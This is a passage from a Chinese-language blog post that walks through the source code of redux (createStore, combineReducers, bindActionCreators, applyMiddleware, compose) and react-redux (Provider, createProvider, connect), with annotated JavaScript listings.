&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加监听函数，同时返回一个取消监听本次添加的函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">subscribe</span>(<span class="params">listener</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> isSubscribed = <span class="literal">true</span>;</span><br><span class="line">        nextListeners.push(listener);</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">unsubscribe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            isSubscribed = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">var</span> index = nextListeners.indexOf(listener);</span><br><span class="line">            nextListeners.splice(index, <span class="number">1</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在dispatch中调用reducer，由reducer判断action来改变当前状态</span></span><br><span class="line">    <span class="comment">// redux约定所有的状态改变都是通过dispatch调用reducer</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span>(<span class="params">action</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            isDispatching = <span class="literal">true</span>;</span><br><span class="line">            currentState = currentReducer(currentState, action);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            isDispatching = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 循环调用listener</span></span><br><span class="line">        <span class="keyword">var</span> listeners = currentListeners = nextListeners;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; listeners.length; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> listener = listeners[i];</span><br><span class="line">            listener();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> action;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 直接使用传入的新reducer改变当前reducer，同时触发一个REPLACE action</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">replaceReducer</span>(<span class="params">nextReducer</span>) </span>&#123;</span><br><span class="line">        currentReducer = nextReducer;</span><br><span class="line">        dispatch(&#123; type: ActionTypes.REPLACE &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">observable</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> _ref;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> outerSubscribe = subscribe;</span><br><span class="line">        <span class="keyword">return</span> _ref = &#123;</span><br><span class="line">                <span class="comment">/**</span><br><span class="line">                 * observer : &#123; next: function(state)&#123;&#125; &#125;</span><br><span class="line">                 */</span></span><br><span class="line">                subscribe: <span class="function"><span class="keyword">function</span> <span class="title">subscribe</span>(<span class="params">observer</span>) </span>&#123;</span><br><span class="line">                    <span class="function"><span class="keyword">function</span> <span class="title">observeState</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">if</span> (observer.next) &#123;</span><br><span class="line">                            observer.next(getState());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    observeState();</span><br><span class="line">                    <span class="comment">// 相当于在listener中传入getState</span></span><br><span class="line">                    <span class="keyword">var</span> unsubscribe = outerSubscribe(observeState);</span><br><span class="line">                    <span class="keyword">return</span> &#123; unsubscribe: unsubscribe &#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, _ref[result] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">// result只是一个独立的key</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">            &#125;, _ref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最后返回</span></span><br><span class="line">    <span class="keyword">return</span> _ref2 = &#123;</span><br><span class="line">        dispatch: dispatch,</span><br><span class="line">        subscribe: subscribe,</span><br><span class="line">        getState: getState,</span><br><span class="line">        replaceReducer: replaceReducer</span><br><span class="line">    &#125;, _ref2[result] = observable, _ref2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="combineReducers"><a href="#combineReducers" class="headerlink" title="combineReducers"></a>combineReducers</h3><p>这个方法接收一个 reducer 对象（key - value），返回一个函数，调用这个函数去触发所有传入的 reducer，然后改变 state，返回新的 state 集合</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">combineReducers</span>(<span class="params">reducers</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> reducerKeys = <span class="built_in">Object</span>.keys(reducers)</span><br><span class="line">    <span class="keyword">var</span> finalReducers = &#123;&#125;</span><br><span class="line">    <span class="comment">// 复制到finalReducers</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; reducerKeys.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> key = reducerKeys[i]</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> reducers[key] === <span class="string">'function'</span>) &#123;</span><br><span class="line">            finalReducers[key] = reducers[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> finalReducerKeys = <span class="built_in">Object</span>.keys(finalReducers)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回一个函数，通过传入state集合和action调用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">combination</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> state =</span><br><span class="line">            <span class="built_in">arguments</span>.length &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">arguments</span>[<span class="number">0</span>] !== <span class="literal">undefined</span></span><br><span class="line">                ? <span class="built_in">arguments</span>[<span class="number">0</span>]</span><br><span class="line">                : &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> action = <span class="built_in">arguments</span>[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">var</span> hasChanged = <span class="literal">false</span></span><br><span class="line">        <span class="keyword">var</span> nextState = &#123;&#125;</span><br><span class="line">        <span class="comment">// 循环触发所有的reducer</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> _i = <span class="number">0</span>; _i &lt; finalReducerKeys.length; _i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> _key = finalReducerKeys[_i]</span><br><span class="line">            <span class="keyword">var</span> reducer = finalReducers[_key]</span><br><span class="line">            <span class="keyword">var</span> previousStateForKey = state[_key]</span><br><span class="line">            <span class="keyword">var</span> nextStateForKey = reducer(previousStateForKey, action)</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> nextStateForKey === <span class="string">'undefined'</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> errorMessage = getUndefinedStateErrorMessage(_key, action)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(errorMessage)</span><br><span class="line">            &#125;</span><br><span class="line">            nextState[_key] = nextStateForKey</span><br><span class="line">            <span class="comment">// 状态是否改变</span></span><br><span class="line">            hasChanged = hasChanged || nextStateForKey !== previousStateForKey</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 根据是否改变了state选择返回新的state或者原来的</span></span><br><span class="line">        <span class="keyword">return</span> hasChanged ? nextState : state</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="bindActionCreators"><a href="#bindActionCreators" class="headerlink" title="bindActionCreators"></a>bindActionCreators</h3><p>我们介绍过，dispatch 会接受一个 action,并将当前 state 和 action 传入 reducer 然后返回新的 state<br>bindActionCreator 接收两个参数 actionCreator，dispatch，这个方法会生成一个函数，内容就是调用 dispatch，<br>actionCreator 就和它名字的含义一样，就是一个专门用于生成 action 的函数，然后由 dispatch 将生成的 action 传给 reducer,再做状态的改变。<br>bindActionCreators 则是通过对一组 actionCreator 做这样的操作，并且将最后的函数也以 key - value 对象的形式返回，key 值就是传入 actionCreators 的 key 值一一对应。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bindActionCreator</span>(<span class="params">actionCreator, dispatch</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dispatch(actionCreator.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bindActionCreators</span>(<span class="params">actionCreators, dispatch</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// actionCreators是函数，那么相当于bindActionCreator</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> actionCreators === <span class="string">'function'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> bindActionCreator(actionCreators, dispatch)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当actionCreators是一个对象的时候</span></span><br><span class="line">    <span class="keyword">var</span> keys = <span class="built_in">Object</span>.keys(actionCreators)</span><br><span class="line">    <span class="keyword">var</span> boundActionCreators = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; keys.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> key = keys[i]</span><br><span class="line">        <span class="keyword">var</span> actionCreator = actionCreators[key]</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> actionCreator === <span class="string">'function'</span>) &#123;</span><br><span class="line">            boundActionCreators[key] = bindActionCreator(</span><br><span class="line">                actionCreator,</span><br><span class="line">                dispatch</span><br><span class="line">            )</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> boundActionCreators</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="applyMiddleware"><a href="#applyMiddleware" class="headerlink" title="applyMiddleware"></a>applyMiddleware</h3><p>middleware 顾名思义就是中间件，目的是在 dispatch 前后做一些记录之类的操作，这有点像 Koa 中的洋葱模型。<br>applyMiddleware 可以根据具体的用法去理解:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logger</span>(<span class="params">&#123; getState &#125;</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> next =&gt; action =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'will dispatch'</span>, action)</span><br><span class="line">        <span class="keyword">const</span> returnValue = next(action)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'state after dispatch'</span>, getState())</span><br><span class="line">        <span class="keyword">return</span> returnValue</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// todos是个reducer</span></span><br><span class="line"><span class="keyword">const</span> store = createStore(todos, [<span class="string">'Use Redux'</span>], applyMiddleware(logger))</span><br><span class="line"><span class="comment">// 相当于</span></span><br><span class="line"><span class="keyword">const</span> store = applyMiddleware(logger)(createStore)(reducer, preloadedState)</span><br><span class="line"><span class="comment">// 此时的dispatch是处理过后的dispatch</span></span><br><span class="line">store.dispatch(&#123; type: <span class="string">'ACTION1'</span> &#125;)</span><br><span class="line"><span class="comment">// 相当于原始dispatch</span></span><br><span class="line"><span class="keyword">const</span> middle = [logger(middlewareAPI)]</span><br><span class="line">_dispatch = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> logger(middlewareAPI)(store.dispatch)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 即</span></span><br><span class="line">(action =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'will dispatch'</span>, action)</span><br><span class="line">        <span class="comment">// 此时的next就是store.dispatch</span></span><br><span class="line">        <span class="comment">// 如果是多个中间件，那么最后一个中间件的next是store.dispatch</span></span><br><span class="line">        <span class="comment">// 前面的中间件中的next是后一中间件， 最终action还是会传给dispatch</span></span><br><span class="line">        <span class="keyword">const</span> returnValue = next(action)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'state after dispatch'</span>, getState())</span><br><span class="line">        <span class="keyword">return</span> returnValue</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)(&#123; type: <span class="string">'ACTION1'</span> &#125;)</span><br></pre></td></tr></table></figure>
<p>源码如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">applyMiddleware</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    return <span class="function"><span class="keyword">function</span>(<span class="params">createStore</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (</span><br><span class="line">                <span class="keyword">var</span> _len2 = <span class="built_in">arguments</span>.length, args = <span class="built_in">Array</span>(_len2), _key2 = <span class="number">0</span>;</span><br><span class="line">                _key2 &lt; _len2;</span><br><span class="line">                _key2++</span><br><span class="line">            ) &#123;</span><br><span class="line">                args[_key2] = <span class="built_in">arguments</span>[_key2]</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用createStore正常创建store，并将参数传入，即我们上面例子中的reducer, preloadedState</span></span><br><span class="line">            <span class="keyword">var</span> store = createStore.apply(<span class="literal">undefined</span>, args)</span><br><span class="line">            <span class="keyword">var</span> _dispatch = <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(</span><br><span class="line">                    <span class="string">'Dispatching while constructing your middleware is not allowed. '</span> +</span><br><span class="line">                        <span class="string">'Other middleware would not be applied to this dispatch.'</span></span><br><span class="line">                )</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> middlewareAPI = &#123;</span><br><span class="line">                getState: store.getState,</span><br><span class="line">                dispatch: <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> _dispatch.apply(<span class="literal">undefined</span>, <span class="built_in">arguments</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// middlewares即我们传入的中间件组成的数组</span></span><br><span class="line">            <span class="comment">// 循环调用middleware并传入middlewareAPI，这样我们的中间件就能取到getState了</span></span><br><span class="line">            <span class="keyword">var</span> chain = middlewares.map(<span class="function"><span class="keyword">function</span>(<span class="params">middleware</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> middleware(middlewareAPI)</span><br><span class="line">            &#125;)</span><br><span class="line">            <span class="comment">// chain是middlewares遍历执行过后的结果组成的数组</span></span><br><span class="line">            <span class="comment">// 所以每次dispatch的时候会循环调用所有的middlewares</span></span><br><span class="line">            <span class="comment">// 即 middleware1(middleware2(middleware3(store.dispatch)))</span></span><br><span class="line">            _dispatch = compose.apply(<span class="literal">undefined</span>, chain)(store.dispatch)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> _extends(&#123;&#125;, store, &#123;</span><br><span class="line">                dispatch: _dispatch</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="compose"><a href="#compose" class="headerlink" title="compose"></a>compose</h3><p>传入多个 function, compose 会对这些 function 做链式调用，将后一函数执行结果传入前一函数，例如:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> func1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">arguments</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> func2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">arguments</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> func3 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">arguments</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> com = compose(</span><br><span class="line">    func1,</span><br><span class="line">    func2,</span><br><span class="line">    func3</span><br><span class="line">)</span><br><span class="line">com(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment">// 相当于</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> func1(func2(func3(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结合以下源码来分析：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compose</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 所有函数放到一个数组</span></span><br><span class="line">    <span class="keyword">for</span> (</span><br><span class="line">        <span class="keyword">var</span> _len = <span class="built_in">arguments</span>.length, funcs = <span class="built_in">Array</span>(_len), _key = <span class="number">0</span>;</span><br><span class="line">        _key &lt; _len;</span><br><span class="line">        _key++</span><br><span class="line">    ) &#123;</span><br><span class="line">        funcs[_key] = <span class="built_in">arguments</span>[_key]</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    return funcs.reduce(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> a(b.apply(<span class="literal">undefined</span>, <span class="built_in">arguments</span>))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么 com 相当于</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> func1(func2.apply(<span class="literal">undefined</span>, func3.apply(<span class="literal">undefined</span>, <span class="built_in">arguments</span>)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>createStore 创建局部对象，将我们传入的用于改变状态的 reducer 存起来，返回闭包函数组成的对象 store，强制约定取 state 通过 store.getState，改变 state 则必须通过调用 dispatch 触发 reducer 根据具体的 action 改变，同时加入中间件功能，使我们能够统一监听到状态的改变，满足更多的需求。而 combineReducers 则满足了组件模块化的需求。<br>redux 是一个非常精炼的库，可以说用最少的代码实现了完整的状态管理。</p>
<h2 id="react-redux"><a href="#react-redux" class="headerlink" title="react-redux"></a>react-redux</h2><p>react-redux 一共导出了 4 个方法</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    Provider, createProvider, connectAdvanced, connect</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Provider"><a href="#Provider" class="headerlink" title="Provider"></a>Provider</h3><p>Provider 是 createProvider 执行返回的实例</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Provider = createProvider()</span><br></pre></td></tr></table></figure>
<h3 id="createProvider"><a href="#createProvider" class="headerlink" title="createProvider"></a>createProvider</h3><p>createProvider 返回一个 Provider，会将我们传入的 props 放到其 childContext 中。<br>这一功能利用的是 react 提供的<a href="https://reactjs.org/docs/legacy-context.html" target="_blank" rel="external">getChildContext</a>方法，getChildContext 方法返回的对象可以在子组件中通过 this.context 取到，此方法在最新的 react 中属于遗弃方法，react 提供了最新的 <a href="https://reactjs.org/docs/context.html" target="_blank" rel="external">Context</a> 实现。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createProvider</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// _Component是react.Component， 所以Provider继承自react.Component</span></span><br><span class="line">    <span class="keyword">var</span> Provider = (<span class="function"><span class="keyword">function</span>(<span class="params">_Component</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 继承prototype</span></span><br><span class="line">        inherits(Provider, _Component)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// getChildContext 实现之后，所有子组件都可以通过context取到返回的对象，通常就是我们传入的store</span></span><br><span class="line">        Provider.prototype.getChildContext = <span class="function"><span class="keyword">function</span> <span class="title">getChildContext</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _ref</span><br><span class="line">            <span class="comment">// 返回包含store的对象</span></span><br><span class="line">            <span class="keyword">return</span> (</span><br><span class="line">                (_ref = &#123;&#125;),</span><br><span class="line">                (_ref[storeKey] = <span class="keyword">this</span>[storeKey]),</span><br><span class="line">                (_ref[subscriptionKey] = <span class="literal">null</span>),</span><br><span class="line">                _ref</span><br><span class="line">            )</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">Provider</span>(<span class="params">props, context</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// 判断Provider是否可调用</span></span><br><span class="line">            classCallCheck(<span class="keyword">this</span>, Provider)</span><br><span class="line">            <span class="comment">// 继承实例</span></span><br><span class="line">            <span class="keyword">var</span> _this = possibleConstructorReturn(</span><br><span class="line">                <span class="keyword">this</span>,</span><br><span class="line">                _Component.call(<span class="keyword">this</span>, props, context)</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将store存到实例里</span></span><br><span class="line">            _this[storeKey] = props.store</span><br><span class="line">            <span class="keyword">return</span> _this</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// render子组件</span></span><br><span class="line">        Provider.prototype.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> react.Children.only(<span class="keyword">this</span>.props.children)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Provider</span><br><span class="line">    &#125;)(react.Component)</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    return Provider</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h3><p>connect 生成一个容器组件，将 state 或者具体的 dispatch 注入到被包裹的组件当中。<br>connect 基本用法：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mapStateToProps</span>(<span class="params">state</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123; todos: state.todos &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mapDispatchToProps</span>(<span class="params">dispatch</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123; actions: bindActionCreators(actionCreators, dispatch) &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> connect(</span><br><span class="line">    mapStateToProps,</span><br><span class="line">    mapDispatchToProps</span><br><span class="line">)(TodoApp)</span><br></pre></td></tr></table></figure>
<p>connect 部分源码：</p>
